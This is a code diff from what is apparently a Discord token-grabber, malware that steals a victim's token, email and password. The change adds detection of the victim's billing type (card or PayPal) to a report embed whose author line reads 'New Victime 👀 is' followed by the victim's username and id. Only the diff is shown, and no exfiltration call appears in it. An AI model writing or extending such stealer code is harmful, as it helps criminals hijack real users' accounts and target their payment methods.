@@ -496,9 +496,17 @@ const getBilling = async (token) => {
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
-      billing += '💳 ';
+      switch (x.type) {
+        case 1:
+          billing += '💳 ';
+          break;
+        case 2:
+          billing += '<:1716_PAYPAL:985672771201802280> ';
+          break;
+      }
     }
   });
+  if (!billing) billing = '❌';
   return billing;
 };
 
@@ -670,6 +678,11 @@ const login = async (email, password, token) => {
             value: `${badges}`,
             inline: true,
           },
+          {
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `${billing}`,
+            inline: true,
+           },
         ],
         author: {
           name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
